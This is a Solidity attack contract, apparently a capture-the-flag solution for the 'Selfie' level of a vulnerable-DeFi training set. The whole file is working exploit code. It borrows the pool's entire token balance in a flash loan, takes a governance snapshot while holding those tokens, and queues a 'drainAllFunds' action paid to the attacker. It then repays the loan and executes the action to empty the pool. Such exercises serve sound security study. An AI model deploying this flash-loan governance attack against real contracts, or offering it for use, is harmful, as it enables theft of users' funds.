// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "hardhat/console.sol";

contract SelfieAttacker {
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    address private immutable owner;

    uint256 exploitActionId;

    constructor(address pool_, address governance_) {
        governance = SimpleGovernance(governance_);
        pool = SelfiePool(pool_);
        owner = msg.sender;
    }

    function exploit() external {
        // flash loan

        flashLoan();
    }

    function drainFund() external {
        governance.executeAction(exploitActionId);
    }

    function flashLoan() internal {
        ERC20Snapshot poolToken = pool.token();
        uint256 poolBalance = poolToken.balanceOf(address(pool));
        pool.flashLoan(poolBalance);
    }

    function createQueueAction() internal {
        bytes memory payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );
        uint256 actionId = governance.queueAction(address(pool), payload, 0);
        exploitActionId = actionId;
    }

    function receiveTokens(address token, uint256 amount) external {
        governance.governanceToken().snapshot();
        createQueueAction();

        // payback
        ERC20Snapshot(token).transfer(address(pool), amount);
    }
}
